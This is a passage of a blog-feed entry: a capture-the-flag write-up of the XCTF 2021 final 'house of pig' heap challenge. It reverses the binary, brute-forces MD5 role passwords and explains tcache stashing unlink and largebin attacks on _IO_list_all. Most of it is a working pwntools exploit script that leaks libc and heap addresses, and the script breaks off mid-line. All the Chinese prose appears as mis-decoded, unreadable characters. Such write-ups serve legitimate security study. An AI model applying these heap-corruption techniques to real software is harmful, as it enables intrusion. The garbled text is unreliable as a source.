    <id>http://deepunk.icu/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-07-27T03:17:56.000Z</published>
    <updated>2023-12-14T15:12:06.947Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Èò¥Èó¥Â†ÜÈ£éÊ∞¥</p></blockquote><h2 id="ÈÄÜÂêë"><a href="#ÈÄÜÂêë" class="headerlink" title="ÈÄÜÂêë"></a>ÈÄÜÂêë</h2><h3 id="‰øÆÂ§çswitch"><a href="#‰øÆÂ§çswitch" class="headerlink" title="‰øÆÂ§çswitch"></a>‰øÆÂ§çswitch</h3><p>0: 0x3985 invalid</p><p>1: 0x3797 add</p><p>2: 0x37B3 show</p><p>3: 0x37cf edit</p><p>4: 0x37eb delet</p><p>5: 0x3807 change role</p><h3 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h3><p>ÈÄöËøáaddÂáΩÊï∞ÔºåÁåúÊµãÂá∫heap_listÔºåheap_sizeÁöÑ‰ΩúÁî®ÔºåÁªìÂêàfree„ÄÅeditÂáΩÊï∞ÊâæÂà∞‰∏§‰∏™Ê†áÂøó‰Ωç</p><p>ÁªìÂêàÊØè‰∏™ÁöÑÂ§ßÂ∞è‰∏éÂÅèÁßªÔºåÊé®ÊµãÂá∫Êï∞ÁªÑÁöÑÊï∞Èáè</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">house</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> *<span class="built_in">list</span>[<span class="number">0x18</span>];</span><br><span class="line">    <span class="type">int</span> size[<span class="number">0x18</span>];</span><br><span class="line">    <span class="type">char</span> flag1[<span class="number">0x18</span>];</span><br><span class="line">    <span class="type">char</span> flag2[<span class="number">0x18</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tmp_house</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">house</span> <span class="title">peppa_house</span>;</span></span><br><span class="line">  <span class="type">int</span> current_peppasize;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">house</span> <span class="title">mummy_house</span>;</span></span><br><span class="line">  <span class="type">int</span> current_mummysize;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">house</span> <span class="title">daddy_house</span>;</span></span><br><span class="line">  <span class="type">int</span> current_daddysize;</span><br><span class="line">  <span class="type">int</span> show_time;</span><br><span class="line">  <span class="type">int</span> edit_time;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h3><ol><li>Â°´ÂÖÖ1‰∏™1Âíån‰∏™0,‰Ωø‰ø°ÊÅØÈïøÂ∫¶‰∏∫N*512+448(bit)</li><li>Áî®64bitÂ≠òÂÇ®Â°´ÂÖÖÂâç‰ø°ÊÅØÈïøÂ∫¶ÔºåÂä†Âú®ÂêéÈù¢ÔºåÈïøÂ∫¶Âèò‰∏∫(N+1)*512</li><li>Ë£ÖÂÖ•Ê†áÂáÜÁöÑÂπªÊï∞: A&#x3D;0x67452301, B&#x3D;0xefcdab89, C&#x3D;0x98badcfe, D&#x3D;0x10325476</li><li>ÂõõËΩÆÂæ™ÁéØËøêÁÆóÔºåÂæ™ÁéØÊ¨°Êï∞‰∏∫ÂàÜÁªÑ‰∏™Êï∞(N+1)</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    start = <span class="string">&quot;3c4400&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000000</span>):</span><br><span class="line">            s=<span class="string">&#x27;A&#x27;</span>+<span class="built_in">str</span>(i)</span><br><span class="line">            <span class="comment">#s=&#x27;B&#x27;+str(i)</span></span><br><span class="line">            <span class="comment">#s=&#x27;C&#x27;+str(i)</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Test %s &quot;</span> % s</span><br><span class="line">            <span class="keyword">if</span> hashlib.md5(s).hexdigest().startswith(start):</span><br><span class="line">                <span class="built_in">print</span>(s)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">A39275120</span></span><br><span class="line"><span class="string">B3332073</span></span><br><span class="line"><span class="string">C75929410</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Âà©Áî®"><a href="#Âà©Áî®" class="headerlink" title="Âà©Áî®"></a>Âà©Áî®</h3><ul><li>addÂ§ßÂ∞è0x90~0x430ÔºåÂêå‰∏ÄËßíËâ≤sizeÂè™ËÉΩÂ¢ûÂä†</li><li>peppa 20Ê¨°Ôºåmummy 10Ê¨°Ôºådaddy 5Ê¨°</li><li>peppa 0x30i, mummy 0x30i + 0x10, daddy 0x31i + 0x20</li><li>view 2Ê¨°Ôºåedit 8Ê¨°</li><li>deletÂêéÊó†Ê≥ïdeletÔºåÂàáÊç¢ËßíËâ≤ÂèØedit„ÄÅview</li><li>daddyÁöÑadd‰∏çÁî®‰∏ÄÁõ¥Â¢ûÂä†ÔºÅ</li><li>daddy addÊúÄÂêé‰∏ÄÊ¨°Êó∂‰ºöÂ§öcalloc0xe8</li></ul><h2 id="Â†ÜÈ£éÊ∞¥"><a href="#Â†ÜÈ£éÊ∞¥" class="headerlink" title="Â†ÜÈ£éÊ∞¥"></a>Â†ÜÈ£éÊ∞¥</h2><h3 id="roleÁöÑÈÄâÊã©"><a href="#roleÁöÑÈÄâÊã©" class="headerlink" title="roleÁöÑÈÄâÊã©"></a>roleÁöÑÈÄâÊã©</h3><p>Ê≥®ÊÑè‰∏çÂêåroleÁöÑÂ†ÜÂàóË°®ÊòØÁã¨Á´ãÁöÑÔºåÂêåÊó∂‰∏çÂêåroleËÉΩ‰øÆÊîπÁöÑ‰ΩçÁΩÆ‰πü‰∏çÂêå</p><p>peppaÂèØ‰ª•‰øÆÊîπfd,bk</p><p>mummyÂèØ‰ª•‰øÆÊîπfd_nextsize,bk_nextsize</p><p>Âõ†ËÄåÊúÄÂ•ΩpeppaÊâìtcache stashing unlink, mummyÊâìlargebin attack</p><p>ÂΩìÁÑ∂Ëøô‰∏çÊòØÁªùÂØπÁöÑÔºåÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáUAFËææÂà∞ÂØπÂêå‰∏Ä‰∏™Â†ÜÂùóÁöÑÊ∑∑Ê∑Ü</p><h3 id="tcache-stashing-unlink"><a href="#tcache-stashing-unlink" class="headerlink" title="tcache stashing unlink"></a>tcache stashing unlink</h3><p>1.<code>tcache</code>‰∏≠Êîæ<code>5</code>‰∏™Ôºå<code>smallbin</code>‰∏≠Êîæ‰∏§‰∏™</p><p>2.Â∞Ü<strong>ÂêéËøõ</strong><code>smallbin</code>ÁöÑ<code>chunk</code>ÁöÑ<code>bk</code>(‰∏çÁ†¥Âùè<code>fd</code>ÊåáÈíàÁöÑÊÉÖÂÜµ‰∏ã)‰øÆÊîπ‰∏∫<code>[target-0x10]</code>(Âç≥target‰∏∫Â∞ÜË¶ÅÂä†ÂÖ•tchacheÁöÑchunkÁöÑuser pointerÂ§ÑÔºâÔºåÂêåÊó∂Â∞ÜÁõÆÊ†áÂú∞ÂùÄ<code>+0x08</code>Â§ÑÔºàÂç≥target-&gt;bk)ÁöÑÂÄºËÆæÁΩÆ‰∏∫‰∏Ä‰∏™ÊåáÂêëÂèØÂÜôÂÜÖÂ≠òÁöÑÊåáÈíà„ÄÇ</p><p> 3.‰ªésmallbin‰∏≠Âèñ‰∏Ä‰∏™chunkÔºåËµ∞ÂÆåstashÊµÅÁ®ãÔºåÁõÆÊ†áÂú∞ÂùÄÂ∞±‰ºöË¢´ÈìæÂÖ•tcache‰∏≠„ÄÇ</p><h3 id="Â∏ÉÂ±ÄÁöÑÈóÆÈ¢ò"><a href="#Â∏ÉÂ±ÄÁöÑÈóÆÈ¢ò" class="headerlink" title="Â∏ÉÂ±ÄÁöÑÈóÆÈ¢ò"></a>Â∏ÉÂ±ÄÁöÑÈóÆÈ¢ò</h3><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><blockquote><p> Âú®tcache‰∏≠Êîæ‰∫Ü5‰∏™ÁöÑÊÉÖÂÜµ‰∏ãÔºåÂ¶Ç‰Ωï‰Ωø‰∏§‰∏™chunkËøõÂÖ•<strong>Áõ∏ÂêåÂ§ßÂ∞è</strong>ÁöÑsmallbinÔºü</p></blockquote><p>ÈóÆÈ¢òËΩ¨Âåñ‰∏∫ÔºöÂ¶Ç‰Ωï‰Ωø‰∏§‰∏™chunkËøõÂÖ•Áõ∏ÂêåÂ§ßÂ∞èÁöÑunsortedbinÔºåËÄå‰∏çËøõÂÖ•tcache</p><p><img src="/../img/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0.assets/image-20230723173130250.png" alt="image-20230723173130250"></p><p>ËÄÉËôëÂΩìunsortedbin‰∏≠Âè™Êúâ‰∏Ä‰∏™chunkÊó∂ÔºåÂàÜÈÖçËæÉÂ∞èÁöÑchunkÊó∂‰ºö‰ªéÂÖ∂‰∏≠Âàá‰∏ÄÂùó‰ΩøÁî®ÔºåÂè¶‰∏ÄÂùóÊîæÂÖ•lastrmainderÔºàÂêåÊ†∑ÊòØunsortedbinÔºâ</p><p>ÊâÄ‰ª•Êàë‰ª¨ÂÖàËé∑Âèñ‰∏Ä‰∏™ËæÉÂ§ßÁöÑunsortedbinÔºåÔºàËøô‰∏ÄÊ≠•ÈÄöËøáÂ°´Êª°tcacheËé∑ÂæóÔºâÔºåÈöèÂêémalloc‰∏ÄÂùóËæÉÂ∞èÁöÑchunk,Â∞±ÂèØ‰ª•Ëé∑ÂæóÁõÆÊ†áÂ§ßÂ∞èÁöÑunsortedbin</p><p>Ê≥®ÊÑèËøôÈáåÊúÄÂêéÈúÄË¶ÅËé∑Âæó‰∏§Âùóunsortedbin,Ê≥®ÊÑèÈÅøÂÖçÂú®ÂàÜÈÖçÁ¨¨‰∫åÂùóÊó∂ÊääÁ¨¨‰∏ÄÂùóÊãøÊéâ„ÄÇÊàë‰∏ÄÂºÄÂßãÂàÜÈÖçÁöÑÂ§ßÂ∞è‰∏∫0x150,ÂàöÂ•ΩÂèØ‰ª•ÊãøÊéâ‰∏Ä‰∏™0xa0Ââ©‰∏ã‰∏Ä‰∏™0xa0,‰ΩÜÊòØÂú®ÂàÜÈÖçÁ¨¨‰∫åÂø´Êó∂Â∞±‰ºöÂá∫Áé∞ÈóÆÈ¢ò</p><p>ÊàëÁöÑËß£ÂÜ≥ÊñπÊ°àÊòØÔºåÂàáÂâ≤0x160ÁöÑÂùóÔºå‰ªé‰∏≠ÂèñÂá∫0xb0ÔºåÂàöÂ•ΩÂâ©‰∏ã0xa0,ÂêåÊó∂Á¨¨‰∫åÊ¨°Âèñ0xb0Êó∂‰∏ç‰ºöÂá∫Áé∞ÊääËé∑ÂæóÁöÑunsortedbinÂèñËµ∞ÁöÑÊÉÖÂÜµ</p><p>ÁΩë‰∏äÁöÑËß£ÂÜ≥ÊñπÊ°àÊòØÔºöÂÜçÂ°´Âè¶‰∏Ä‰∏™tcacheÔºå‰∏§Ê¨°Áî®‰∏çÂêåÁöÑunsortedbinÂàáÂâ≤Ôºå‰ΩÜÊòØËøôÁßçÊñπÊ≥ïÊØîËæÉÊµ™Ë¥πÊ¨°Êï∞</p><p>ÂêåÊó∂ÔºåÁªèËøáËÆ°ÁÆó„ÄÅÂæÆË∞ÉÔºåÊàëËøôÈáåÂàá‰∏ãÊù•ÁöÑsmallbinÁöÑfdÂíåbkÂàöÂ•Ω‰Ωç‰∫échunk1-&gt;7,1-&gt;8ÁöÑÂèØÂÜôÂå∫Âüü</p><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><blockquote><p>ÊîπÂà∞_IO_list_allÁöÑÊåáÈíàÂêéÔºåÂ¶Ç‰Ωï‰øÆÊîπÂÜÖÂÆπÔºü</p></blockquote><p>Êú¨È¢òÊØîËæÉÈò¥Èó¥ÁöÑÂú∞ÊñπÊòØÔºå‰∏çËÉΩÂÆåÊï¥Âú∞‰øÆÊîπ‰∏Ä‰∏™Â†ÜÂùó</p><p>Â•ΩÂú®Âá∫È¢ò‰∫∫Áªôadd3Âä†‰∫Ü‰∏Ä‰∏™gift,ÂèØ‰ª•Áî≥ËØ∑‰∏Ä‰∏™0xe8ÁöÑÂÆåÊï¥ÂèØÂÜôÁöÑÂ†ÜÂùó</p><p>ÊâÄ‰ª•ÊúÄÂêéÂèØ‰ª•Êäälargebin attackÊåáÂêëÁöÑlargebinÁïôÁùÄÔºåÂÆåÊàêadd3ÁöÑÊúÄÂêé‰∏ÄÊ≠•Ôºå‰ΩøÂæódaddy‰ªéËøô‰∏™largechunk‰∏≠Âàá‰∏ÄÂùóÔºå‰ªéËÄåÁõ¥Êé•Ëé∑ÂæóÂÆåÊï¥ÁöÑ‰øÆÊîπÊùÉÈôê</p><p>‰∏ãÁ≠ñÊòØ‰øÆÊîπlarge chunkÁöÑchainÊåáÈíàÔºå‰ΩøÂÖ∂ÊåáÂêëÂèØÂÜôÂ†ÜÂùó</p><h3 id="Â∏ÉÂ±Ä"><a href="#Â∏ÉÂ±Ä" class="headerlink" title="Â∏ÉÂ±Ä"></a>Â∏ÉÂ±Ä</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line">p = process(<span class="string">&quot;./pig&quot;</span>)</span><br><span class="line"><span class="comment"># libc=ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = remote(host, port)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>): <span class="comment">#0xa0-0x430</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size: &quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendafter(<span class="string">&quot;message: &quot;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">p.sendafter(<span class="string">&quot;message: &quot;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delet</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">role</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> role == <span class="number">1</span>:</span><br><span class="line">p.sendlineafter(<span class="string">&quot;user:\n&quot;</span>, <span class="string">&quot;A39275120&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> role == <span class="number">2</span>:</span><br><span class="line">p.sendlineafter(<span class="string">&quot;user:\n&quot;</span>, <span class="string">&quot;B3332073&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> role == <span class="number">3</span>:</span><br><span class="line">p.sendlineafter(<span class="string">&quot;user:\n&quot;</span>, <span class="string">&quot;C75929410&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#tcache 0xa0</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))<span class="comment">#2-&gt;4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#unsortedbin-&gt;smallbin</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#tcache 0x160</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))<span class="comment">#1-&gt;6</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))<span class="comment">#1-&gt;7</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))<span class="comment">#protect 2-&gt;5</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))<span class="comment">#1-&gt;8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fill tcache 0x160</span></span><br><span class="line">delet(<span class="number">0</span>)</span><br><span class="line">delet(<span class="number">1</span>)</span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">3</span>)</span><br><span class="line">delet(<span class="number">4</span>)</span><br><span class="line">delet(<span class="number">5</span>)</span><br><span class="line">delet(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fill tcache 0xa0 to 5</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">0</span>)</span><br><span class="line">delet(<span class="number">1</span>)</span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">3</span>)</span><br><span class="line">delet(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#split into unsorted bin</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">delet(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">change(<span class="number">1</span>)<span class="comment">#to clear flag0</span></span><br><span class="line">view(<span class="number">7</span>)<span class="comment">#leak libc</span></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x219ce0</span></span><br><span class="line">free_hook = libc_base + <span class="number">0x2204a8</span></span><br><span class="line">iolistall = libc_base + <span class="number">0x21a680</span></span><br><span class="line">memset_got = libc_base + <span class="number">0x219188</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;free_hook = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(free_hook)))</span><br><span class="line">log.success(<span class="string">&quot;iolistall = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(iolistall)))</span><br><span class="line">log.success(<span class="string">&quot;memset_got = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(memset_got)))</span><br><span class="line"></span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0xb0</span>, cyclic(<span class="number">0x30</span>))<span class="comment">#smallbin 0 = 1-&gt;7</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))<span class="comment">#into smallbin 1-&gt;9</span></span><br><span class="line">delet(<span class="number">8</span>)</span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0xb0</span>, cyclic(<span class="number">0x30</span>))<span class="comment">#smallbin 1 = 1-&gt;8</span></span><br><span class="line"><span class="comment">#unsortedbin finished, 1-&gt;9(0x160);2-&gt;5(0xa0);3-&gt;1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak heap_base</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment">#1-&gt;10</span></span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment">#1-&gt;11</span></span><br><span class="line">delet(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment">#1-&gt;12</span></span><br><span class="line">fixed_largebin_fd = libc_base + <span class="number">0x21a0d0</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x160</span>)</span><br><span class="line">edit(<span class="number">10</span>, payload)</span><br><span class="line">view(<span class="number">10</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;daaa&quot;</span>)</span><br><span class="line">heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x13120</span></span><br><span class="line">log.success(<span class="string">&quot;heap0_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"><span class="comment">#fix it</span></span><br><span class="line">payload = p64(fixed_largebin_fd)*<span class="number">2</span> + cyclic(<span class="number">0x150</span>)</span><br><span class="line">edit(<span class="number">10</span>, payload)</span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 2-&gt;6 largebin1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#largebin attack</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 2-&gt;7 largebin2</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 1-&gt;13 protect</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 2-&gt;8 </span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span 